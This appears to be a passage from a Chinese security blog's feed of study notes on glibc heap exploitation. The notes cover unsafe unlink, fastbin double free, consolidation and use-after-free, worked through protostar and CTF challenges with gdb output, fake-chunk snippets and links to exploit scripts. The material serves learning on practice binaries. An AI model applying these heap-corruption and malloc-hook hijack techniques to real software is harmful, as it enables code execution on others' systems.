f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==13==ABORTING</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;模糊测试&quot;&gt;&lt;a href=&quot;#模糊测试&quot; class=&quot;headerlink&quot; title=&quot;模糊测试&quot;&gt;&lt;/a&gt;模糊测试&lt;/h2&gt;&lt;p&gt;模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是将自动或半自动生成的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。&lt;/p&gt;
&lt;p&gt;模糊测试最早由威斯康星大学的Barton Miller于1988年提出。他们的工作不仅使用随机无结构的测试数据，还系统的利用了一系列的工具去分析不同平台上的各种软件，并对测试发现的错误进行了系统的分析。此外，他们还公开了源代码，测试流程以及原始结果数据。&lt;/p&gt;
&lt;p&gt;模糊测试工具主要分为两类，变异测试（mutation-based）以及生成测试（generation-based）。模糊测试可以被用作白盒，灰盒或黑盒测试。文件格式与网络协议是最常见的测试目标，但任何程序输入都可以作为测试对象。常见的输入有环境变量，鼠标和键盘事件以及API调用序列。甚至一些通常不被考虑成输入的对象也可以被测试，比如数据库中的数据或共享内存。&lt;/p&gt;
&lt;p&gt;对于安全相关的测试，那些跨越可信边界的数据是最令人感兴趣的。比如，模糊测试那些处理任意用户上传的文件的代码比测试解析服务器配置文件的代码更重要。因为服务器配置文件往往只能被有一定权限的用户修改。&lt;/p&gt;</summary>
    
    
    
    <category term="AFL" scheme="http://finsenty54.github.io/categories/AFL/"/>
    
    
    <category term="AFL" scheme="http://finsenty54.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>heap入门2</title>
    <link href="http://finsenty54.github.io/2021/03/20/heap%E5%85%A5%E9%97%A82/"/>
    <id>http://finsenty54.github.io/2021/03/20/heap%E5%85%A5%E9%97%A82/</id>
    <published>2021-03-20T11:30:30.000Z</published>
    <updated>2021-03-20T11:31:15.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>objdump -M intel -D ./heap0 | grep winner</code><br><code>gef➤  help search-pattern </code></p><h2 id="nightmare"><a href="#nightmare" class="headerlink" title="nightmare"></a>nightmare</h2><h2 id="protostar-heap0"><a href="#protostar-heap0" class="headerlink" title="protostar:heap0"></a>protostar:heap0</h2><p><code>objdump -D heap0 | grep winner</code></p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/nightmare/modules/24-heap_overflow/protostar_heap0]└──╼ $objdump -M intel -D ./heap0 | grep winner080484b6 &lt;winner&gt;:080484e1 &lt;nowinner&gt;:</code></pre><p>简单的堆溢出，复制时没有检查大小</p><a id="more"></a><h2 id="protostar-heap1"><a href="#protostar-heap1" class="headerlink" title="protostar:heap1"></a>protostar:heap1</h2><p>strcpy 没有检查大小<br>第一次strcpy进行溢出，覆盖地址为got表中put地址，第二次向puts地址写入winner()函数地址，接下来调用puts()的时候，实际上调用到winner()</p><pre><code>gef➤  help search-pattern SearchPatternCommand: search a pattern in memory. If given an hex value (starting with 0x)</code></pre><p>可以用来搜索内存中值，打印位置</p><h2 id="protostar-heap2"><a href="#protostar-heap2" class="headerlink" title="protostar:heap2"></a>protostar:heap2</h2><p>%p 打印地址</p><pre><code>    00100ab3 48 8d 85        LEA        RAX=&gt;local_98,[RBP + -0x90]             70 ff ff ff    00100aba 48 83 c0 07     ADD        RAX,0x7</code></pre><p>The strdup() function returns a pointer to a new string which is a duplicate of the string s.  Memory for the new string is obtained with malloc(3), and can be freed with free(3).</p><p>复制时 没有大小检查，且是分配在堆上</p><h2 id="Unlink-explannation"><a href="#Unlink-explannation" class="headerlink" title="Unlink() explannation"></a>Unlink() explannation</h2><p><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344">https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</a><br>malloc 代码 里有unlink</p><h3 id="什么是unlink攻击"><a href="#什么是unlink攻击" class="headerlink" title="什么是unlink攻击"></a>什么是unlink攻击</h3><p>The most common scenario is a vulnerable <code>buffer that can be overflow </code>and has <code>a global pointer</code>. 要是全局变量  </p><ol><li>要有溢出漏洞</li><li>chunk地址存在一指针数组中，且是全局变量</li></ol><p><code>unlink()</code> 是将双向链表的 块拿出来， 就需要重新调整 fd 和 bk 指针<br>例如 free 时和目前物理相邻的 free chunk 进行合并<br>It handles the process of overwriting pointers from the next and previous chunks to the other, to fill in the gap from taking out the chunk in the middle.</p><h3 id="第一个检查：："><a href="#第一个检查：：" class="headerlink" title="第一个检查：："></a>第一个检查：：</h3><p>The first check we need to worry about, is it checks if the Fd and Bk pointers of our fake heap chunk (they point to the next and previous chunks) point to chunks that have <code>pointers back</code> to our fake chunk.</p><hr><p>构建一个fake chunk，这个chunk 可以在已申请的chunk中构建，因为我们可以写入值。<br><code>temp = (uint64_t *)ptr0[2]; </code> 将fd的值指针化后赋给 temp<br><code>printf(&quot;Fd-&gt;bk:    \t\t%p\n&quot;, (void *)temp[3]); </code><br>%p 按十六进制输出数据 </p><h3 id="void-为”无类型指针”"><a href="#void-为”无类型指针”" class="headerlink" title="void * 为”无类型指针”"></a>void * 为”无类型指针”</h3><p>内存分配函数 malloc 函数返回的指针就是 void * 型，用户在使用这个指针的时候，要进行强制类型转换，也就是显式说明该指针指向的内存中是存放的什么类型的数据 (int <em>)malloc(1024) 表示强制规定 malloc 返回的 void</em> 指针指向的内存中存放的是一个个的 int 型数据。</p><hr><h3 id="fake-chunk-fd-bk"><a href="#fake-chunk-fd-bk" class="headerlink" title="fake_chunk fd bk"></a>fake_chunk fd bk</h3><p>fd 在<code>0x10</code> 偏移处，bk 在<code>0x18</code>偏移处<br>fake= ptr0<br>target=ptr0<br><code>fake-&gt;fd = target-0x18 =FD </code>减0x18是因为下面是<code>取 bk </code><br>因为 FD-&gt; bk = fake FD的其他结构值都不重要，只要bk值，这里就是&amp;target，这个地址保存着fake chunk metadata的开始地址，即ptr0<br><code>target-0x18+0x18 = fake chunk = ptr0</code></p><p>同理</p><pre><code>fake-&gt;bk=target-0x10 =BKBK-&gt;fd = fake = ptr0target-0x10 + 0x10 =ptr0</code></pre><p>we will edit the <code>heap metadata of the second chunk</code>, so that it will say that the previous chunk has been freed and it points to our fake chunk.<br>只要设置<code>prev_size</code>，到metadata开始处，就认为是其前一个块</p><p>Then when we free the second chunk, it will cause our fake chunk to <code>be unlinked</code> and execute the <code>pointer write</code>.<br>will check that the size of our chunk is equal to the previous size of the chunk being freed<br><strong>利用堆溢出 来修改</strong></p><hr><p>The final check we have to worry about is for fd_nextsize. Essentially it just checks to see if it is equal to 0x0, and if it is it skips a bunch of checks.<br>现在不为0才跳过一些检查</p><h3 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h3><pre><code>struct malloc_chunk &#123;  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */  struct malloc_chunk* fd;         /* double links -- used only if free. */  struct malloc_chunk* bk;  /* Only used for large blocks: pointer to next larger size.  */  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */  struct malloc_chunk* bk_nextsize;&#125;;</code></pre><p>双向链表结构的bin中，fd_nextsize 指向下一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>bk_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>就是 bk 接下来的8字节，</p><h3 id="unlink-写操作"><a href="#unlink-写操作" class="headerlink" title="unlink 写操作"></a>unlink 写操作</h3><p>unlink操作如下：：</p><pre><code>FD = fake-&gt;fd;BK = fake-&gt;bk;FD-&gt;bk = BKBK-&gt;fd = FD</code></pre><p>那么最后，<code>BK-&gt;fd = FD</code><br>Fd pointer: 0x55d9452cf038<br>Bk  pointer: 0x55d9452cf040<br>Bk-&gt;Fd:            0x55d946d5d420  即target地址存储的值<br>*target=fd=0x55d9452cf038</p><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#unsafe_unlink">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#unsafe_unlink</a><br>这时 chunk0_ptr 和 chunk0_ptr[3] 实际上就是同一东西。这里可能会有疑惑为什么这两个东西是一样的，因为 chunk0_ptr 指针在是放在数据段上的，<strong>地址在 0x601070</strong>，<strong>指向 0x601058</strong>，而 chunk0_ptr[3] 的意思是从 chunk0_ptr <strong>指向的地方</strong>开始数 3 个单位，所以 *<em>0x601058+0x08</em>3=0x601070**</p><p>所以给chunk0[3] 赋值 就相当于给chunk赋值，最后chunk[0] 为改写地址处的内容<br>chunk0是指针（重要）<br>&amp;chunk0[3]==&amp;chunk0</p><h2 id="nightmare-HITCON’14-stkof"><a href="#nightmare-HITCON’14-stkof" class="headerlink" title="nightmare HITCON’14: stkof"></a>nightmare HITCON’14: stkof</h2><p><code>00602100</code><br>Our exploitation process will contain two parts. The first will be<code> doing an Unlink Attack</code>, and the second will be a <code>GOT overwrite / infoleak</code>.</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>Unlinking for the heap is the process of removing a chunk from a bin list (in this case for heap consolidation for performance improvement reasons).</p><p>What this attack will do is <code>give us a write</code>.<br>However there are a lot of restrictions on what we can write and where we can write.<br>Essentially when an unlink happens, it will write pointers to a chunk to fill in the gap of the chunk that was taken out.<br>这就是写的来源<br>因为最后<code>BK-&gt;fd=FD</code></p><p>本题中指针ptr，所在是一个指针数组，数组中的内容是指针，指向其他地方<br>首先我们要有一个指向 一个chunk块的指针ptr，来使得bk-&gt;fd 和 fd-&gt;bk指向fake chunk<br>题目中malloc后地址</p><pre><code>                /* 将块地址保存在这里 */*(void **)(&amp;DAT_00602140 + (long)(int)DAT_00602100 * 8) = pvVar1;    004009a8 48 98           CDQE    004009aa 48 8b 55 88     MOV        RDX,qword ptr [RBP + local_80]                         将块地址保存在这里    004009ae 48 89 14        MOV        qword ptr [DAT_00602140 + RAX*0x8],RDX             c5 40 21              60 00</code></pre><p>动态运行下就知道地址</p><pre><code> →   0x4009ae                  mov    QWORD PTR [rax*8+0x602140], rdx此时$rax   : 0x1               所以保存在地址0x602148</code></pre><p>接着来设置 fake chunk 的fd , bk指针</p><p>所以先分配两个块，这两个块不一定要相邻在一起，相邻可以简单地使用堆溢出，也好融合，然后在第一个块中创建fake chunk， 在free第二个块后，触发Unlink </p><pre><code>那么fake chunk fd=ptr-0x18   , fd-&gt;bk=ptrfake chunk bk=ptr-0x10 , bk -&gt;fd=ptr</code></pre><p>然后是设置size, pre_size和size要相符，然后是fd_nextsize == null （在glibc2.23下）</p><p>unlink 后<br><code>*ptr=ptr-0x8*3</code><br>可以用来got覆写</p><h3 id="GOT-Overwrite-Infoleak"><a href="#GOT-Overwrite-Infoleak" class="headerlink" title="GOT Overwrite / Infoleak"></a>GOT Overwrite / Infoleak</h3><p>现在有了一个指向指针数组的指针<br>就可以 向数组中写入指针</p><hr><p><a href="https://github.com/Finsenty54/attack-code/blob/master/heap/Hitcon_2014_stkof/myexploit.py">https://github.com/Finsenty54/attack-code/blob/master/heap/Hitcon_2014_stkof/myexploit.py</a><br>代码以及注解</p><h2 id="zctf-2016-note2"><a href="#zctf-2016-note2" class="headerlink" title="zctf 2016 note2"></a>zctf 2016 note2</h2><p>把名字放在这里006020e0<br>最多四个块</p><hr><p><code>DAT_00602120</code>分配的块的地址放在这里，8字节，顺序排列<br>相应块的输入值大小放在DAT_00602140</p><p>这些位置在<code>bss</code>中，全局未初始化变量</p><pre><code>Chunk(addr=0x108c2a0, size=0x90, flags=PREV_INUSE)    [0x000000000108c2a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]Chunk(addr=0x108c330, size=0x90, flags=PREV_INUSE)    [0x000000000108c330     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]Chunk(addr=0x108c3c0, size=0x90, flags=PREV_INUSE)    [0x000000000108c3c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]Chunk(addr=0x108c450, size=0x90, flags=PREV_INUSE)    [0x000000000108c450     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]Chunk(addr=0x108c4e0, size=0x20b30, flags=PREV_INUSE)  ←  top chunkgef➤  x/32gx 0x006021200x602120:    0x000000000108c2a0    0x000000000108c3300x602130:    0x000000000108c3c0    0x000000000108c450</code></pre><p>自带的libc-2.19.so 太老了，使用2.23</p><p>overwrite_append() 函数里有数组长度检查，没有堆溢出<br>教程这里，将输入的长度设为0x00，造成整数溢出？？因为确实0x00-1=0xffffffff，同时设置成0x00，还是会分配0x20的空间</p><p>The first will hold our fake chunk for the unlink. The second chunk we will use to <code>overflow the metadata of the third chunk</code>. The third chunk will be the one which we overwrite the <code>heap metadata to point to the fake chunk,</code> and we free it.<br>只用修改prev_size</p><hr><pre><code>0x23ce320:    0x0000000000000000    0x00000000000000210x23ce330:    0x3535353535353535    0x35353535353535350x23ce340:    0x00000000000000a0    0x00000000000000900x23ce350:    0x3131313131313100    0x3131313131313131</code></pre><p>溢出</p><p><a href="https://github.com/Finsenty54/attack-code/blob/master/heap/zctf_2016_note2/exploit.py">https://github.com/Finsenty54/attack-code/blob/master/heap/zctf_2016_note2/exploit.py</a><br>攻击代码<br><strong>泄露got表中内容，即实际地址值</strong></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h2&gt;&lt;p&gt;&lt;code&gt;objdump -M intel -D ./heap0 | grep winner&lt;/code&gt;&lt;br&gt;&lt;code&gt;gef➤  help search-pattern &lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;nightmare&quot;&gt;&lt;a href=&quot;#nightmare&quot; class=&quot;headerlink&quot; title=&quot;nightmare&quot;&gt;&lt;/a&gt;nightmare&lt;/h2&gt;&lt;h2 id=&quot;protostar-heap0&quot;&gt;&lt;a href=&quot;#protostar-heap0&quot; class=&quot;headerlink&quot; title=&quot;protostar:heap0&quot;&gt;&lt;/a&gt;protostar:heap0&lt;/h2&gt;&lt;p&gt;&lt;code&gt;objdump -D heap0 | grep winner&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌─[zentreisender@parrotos]─[~/Documents/nightmare/modules/24-heap_overflow/protostar_heap0]
└──╼ $objdump -M intel -D ./heap0 | grep winner
080484b6 &amp;lt;winner&amp;gt;:
080484e1 &amp;lt;nowinner&amp;gt;:&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;简单的堆溢出，复制时没有检查大小&lt;/p&gt;</summary>
    
    
    
    <category term="heap" scheme="http://finsenty54.github.io/categories/heap/"/>
    
    
    <category term="heap" scheme="http://finsenty54.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>heap入门1</title>
    <link href="http://finsenty54.github.io/2021/03/12/heap%E5%85%A5%E9%97%A81/"/>
    <id>http://finsenty54.github.io/2021/03/12/heap%E5%85%A5%E9%97%A81/</id>
    <published>2021-03-12T12:05:25.000Z</published>
    <updated>2021-03-12T12:32:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code> &quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;</code> 更改glibc版本<br><code>pwd</code>显示当前目录<br><code>apropos</code>搜索man手册<br><code>gef-&gt;search-patten</code><br><code>objdump -M intel</code>汇编改为intel语法<br><code>set disassambly intel</code> gdb更改语法<br><code>b print </code>printf函数下断点</p><a id="more"></a><p>在gdb 里启动gef<br><code>(gdb) source ~/.gdbinit-gef.py</code></p><p>或者传递命令<br><code>gdb.attach(p,&quot;source ~/.gdbinit-gef.py&quot;)</code></p><hr><p><code>gef➤  heap-view </code></p><pre><code>gef➤  gotGOT protection: Partial RelRO | GOT functions: 3[0x804c00c] printf@GLIBC_2.0  →  0x8049036[0x804c010] __libc_start_main@GLIBC_2.0  →  0xf7ddcd40[0x804c014] __isoc99_scanf@GLIBC_2.7  →  0x8049056</code></pre><hr><pre><code>gef➤  heap binsgef➤  heap chunksgef➤  heap chunksChunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE)    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE)    [0x00005555555592a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]Chunk(addr=0x5555555592c0, size=0x20d50, flags=PREV_INUSE)  ←  top chunkgef➤  x/6gx 0x5555555592c00x5555555592c0:    0x0000000000000000    0x00000000000000000x5555555592d0:    0x0000000000000000    0x00000000000000000x5555555592e0:    0x0000000000000000    0x0000000000000000gef➤  x/6gx 0x5555555592c0-0x100x5555555592b0:    0x0000000000000000    0x0000000000020d510x5555555592c0:    0x0000000000000000    0x00000000000000000x5555555592d0:    0x0000000000000000    0x0000000000000000</code></pre><p>查看glibc版本</p><pre><code>┌─[✗]─[zentreisender@parrotos]─[~]└──╼ $ldd --versionldd ./program 显示链接器，加载器版本</code></pre><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><code>call malloc, it returns a pointer to a chunk</code><br>返回一个地址</p><p>64bit 一个chunk段16字节，32bit 8 字节</p><p>查看二进制文件依赖的动态链接库命令 ldd</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术</p><h3 id="RELRC"><a href="#RELRC" class="headerlink" title="RELRC"></a>RELRC</h3><p>Firstly, <code>PLT</code> needs to be located at <code>a fixed offset</code> from the .text section. Secondly, since GOT contains data used by different parts of the program directly, it needs to be allocated at a known static address in memory. Lastly, and more importantly, because the GOT is lazily bound it needs to be writable.</p><p><code>PLT GOT 的偏移都是 写死在文件上</code><br>the linker resolves all dynamically linked functions<code> at the beginning of the execution,</code> and then <code>makes the GOT read-only</code>. 这就是RELRC</p><p>In partial RELRO, the non-PLT part of the GOT section (.got from readelf output) is read only but <code>.got.plt is still writeable</code>. Whereas in complete RELRO, the entire GOT (.got and .got.plt both) is marked as read-only.</p><p><code>.got</code> Section 存放外部全局变量的 GOT 表，非延迟绑定<br><code>.got.plt</code> Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定。</p><p>.got is for relocations regarding global ‘variables’ while .got.plt is a auxiliary section to act together with .plt when resolving procedures absolute addresses</p><h2 id="编译安装glibc各版本"><a href="#编译安装glibc各版本" class="headerlink" title="编译安装glibc各版本"></a>编译安装glibc各版本</h2><p>下载源码后<br><a href="https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html">https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html</a></p><h3 id="gcc10编译安装glibc-2-23"><a href="#gcc10编译安装glibc-2-23" class="headerlink" title="gcc10编译安装glibc 2.23"></a>gcc10编译安装glibc 2.23</h3><pre><code>../glibc-2.20/configure --prefix=/usr --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror</code></pre><p><code>--disable-werror</code> 这项是忽略错误</p><h3 id="gcc10编译安装glibc-2-27"><a href="#gcc10编译安装glibc-2-27" class="headerlink" title="gcc10编译安装glibc 2.27"></a>gcc10编译安装glibc 2.27</h3><pre><code>CFLAGS=&quot;-g -fcommon -Og&quot; CXXFLAGS=&quot;-g -fcommon -Og&quot; ../glibc-2.27/configure --prefix=/glibc/2.27 --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror </code></pre><p>我编译的时候报了重复定义的错误，加<code>-fcommon</code> 忽视</p><h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><p> first-fit behavior.<code>If a chunk is free and large enough, malloc will select this chunk.</code></p><p>Whenever <code>any chunk</code> (not a fast chunk) is freed,<code> it ends up in the unsorted bin.</code> Insertion happens at the <code>HEAD of the list</code>.</p><p>fast chunks end up in fastbins. As mentioned earlier, fastbins maintain a singly linked list and chunks are inserted and deleted from the HEAD end。<code>头插法</code></p><h3 id="calc"><a href="#calc" class="headerlink" title="calc::"></a>calc::</h3><h4 id="索引计算公式：："><a href="#索引计算公式：：" class="headerlink" title="索引计算公式：："></a>索引计算公式：：</h4><p>The basic formula is as follows:</p><pre><code>        IDX = (CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT        On a 64 bit system the current values are:                MINSIZE: 0x20                MALLOC_ALIGNMENT: 0x10        So we get the following equation:        IDX = (CHUNKSIZE - 0x11) / 0x10</code></pre><h4 id="chunksize计算公式：："><a href="#chunksize计算公式：：" class="headerlink" title="chunksize计算公式：："></a>chunksize计算公式：：</h4><pre><code>It is calculated as follows:        IF x + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)        ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)         =&gt; CHUNKSIZE = (x + 0x8 + 0xf) &amp; ~0xf</code></pre><p>64位下，将<code>最低四位置0</code>，因为size 总是16的倍数，要对齐</p><p>当 req=24 时，request2size(24)=32。0x18+0x8+0xf &amp; ~0xf = 0x20而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节</p><h3 id="fastbin-dup-c"><a href="#fastbin-dup-c" class="headerlink" title="fastbin_dup.c"></a>fastbin_dup.c</h3><p>**double-free **<br><a href="https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html">https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html</a><br>同一地址释放两次，再分配时，可以得到同一地址的两个指针，释放一个指针，但可通过另外一个指针操作释放的这个相同块，放入一些数据</p><p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">https://blog.csdn.net/chennbnbnb/article/details/109284780</a><br>glibc2.31 版本下double free<br>tcache全称是Thead Cache</p><p>首先要填充tcache bin，再分配释放后到 fastbin</p><h3 id="fastbin-dup-into-stack-c-2-23"><a href="#fastbin-dup-into-stack-c-2-23" class="headerlink" title="fastbin_dup_into_stack.c 2.23"></a>fastbin_dup_into_stack.c 2.23</h3><p>在2.31下触发free(): double free detected in tcache 2</p><p>fastbin 是单链，只有fd指针，指向下一个块<br>通过修改fd指针，指向一个伪造的fake chunk</p><pre><code>gef➤  x/15gx 0x602010-0x100x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed twice]0x602010:   0x0000000000602020  0x0000000000000000      &lt;-- fd pointer0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c0x602050:   0x4343434343434343  0x00000000000000000x602060:   0x0000000000000000  0x0000000000020fa10x602070:   0x0000000000000000</code></pre><hr><pre><code>unsigned long long *d = malloc(8);stack_var = 0x20;*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></pre><p>fastbin 的fd指针指向下一个空闲块的<code> metadata开始的地址处</code><br>malloc 返回的地址指向的是<code>user data开始处</code>，d是double free后的重复块地址，所以上面的赋值是 将<code>fake_chunk的metadata起始地址 赋给 块中的fd指针</code>，因为这是 d 是double free，虽然分配了，但<code>也指向空闲块中</code>，将chUnk fd 指针指向一个 fake chunk 的metadata起始地址处，即prev_size ; size=20; userdata。</p><pre><code>Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55555555a010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x7fffffffdd50, size=0x20, flags=)  ←  Chunk(addr=0x55555555a020, size=0x0, flags=) [incorrect fastbin_index] </code></pre><p>可以看到成功</p><p>typedef struct var newtype;<br>struct var 的别名为newtype、</p><h3 id="heap-consolidation"><a href="#heap-consolidation" class="headerlink" title="heap_consolidation"></a>heap_consolidation</h3><p>Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.<br>edit a freed chunk using a heap overflow bug to cause consolidation</p><p>overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed</p><p>这样就再分配后，就有两个指针指向同一个块</p><p>改写当前size中 is_prev位，使得释放当前块后，认为<code>前一个块是free的</code><br>heap_overflow </p><pre><code>ptr2 = malloc(0x500);ptr2[-1] 指示sizeptr[-2] 指示prev_size</code></pre><p><code>fastbin_dup_consolidate.c 2.23</code><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate</a><br>利用在 large bin 的分配中 malloc_consolidate 机制绕过 fastbin 对 double free 的检查</p><p>malloc(0x400) small bins（回收最大值）后，<code>fastbin 中的跑到 small bins中</code><br>[+] small_bins[4]: fw=0x55555555b000, bk=0x55555555b000<br> →   Chunk(addr=0x55555555b010, size=0x50, flags=PREV_INUSE)</p><p>2.23 里malloc_consolidate，先回收 fastbins 里的到unsorted bin中，因为这个bin满足不了分配要来，按照大小 又到了small bins中，也有可能到达large bins中。</p><p><code>此时可以再free() 一次，因为该块不在fastbin，释放后归到fastbins中。</code></p><p>这样我们就相当于double free</p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>一般称被释放后没有被设置为 NULL 的内存指针为<code> dangling pointer</code></p><p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p><p>释放块后，指向其的指针不清除，所以可以再用这个指针写入数据</p><h2 id="babyheap-2017"><a href="#babyheap-2017" class="headerlink" title="babyheap 2017"></a>babyheap 2017</h2><p>有点莽，说实话不是很懂<br><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap</a><br><a href="https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html">https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html</a><br><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></p><p>GNU/Linux 2.6.32 对应着glibc 2.23版本</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/heap/题目]└──╼ $file /glibc/2.23/lib/libc-2.23.so /glibc/2.23/lib/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /glibc/2.23/lib/ld-linux-x86-64.so.2, BuildID[sha1]=eb6c32093c3e8e3b1c03a382947ec4151d036d75, for GNU/Linux 2.6.32, with debug_info, not stripped</code></pre><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>The first will involve <code>causing heap consolidation to get a libc infoleak</code>. The second will involve using <code>a Fastbin Attack to write a oneshot gadget to the hooc of malloc</code>. The libc infoleak will allow us to break ASLR in libc and know the address of everything, and writing over the malloc hook with a ROP gadget (that will call system) will <code>give us a shell</code> when we call malloc (we need the infoleak to figure out where the malloc hook and rop gadget are)<br>也可以使用chunck overlap泄露unsorted bin的地址</p><hr><p>题目不是原本的相同实现方法，但思想是不变的<br>开启了<code>relrc</code>,不能修改got；alloc pointers in a <code>random mmap area</code>. Therefore, we do not know the address to launch the <code>“unsafe unlink” attack</code></p><hr><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p><code>v6 = __readfsqword(0x28u);</code><br>Read memory from a location specified by an offset relative to the beginning of the GS segment.<br><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160">https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160</a></p><pre><code>void* calloc (size_t num, size_t size);Allocate and zero-initialize arraySize of each element.pData = (int*) calloc (i,sizeof(int));</code></pre><p>fill 中size由自己定义，存在漏洞, the vulnerability is evident. We can fill the arbitrary length of input to the heap and overflow anything after that.</p><p><code>$readelf -s /glibc/2.23/lib/libc-2.23.so | grep 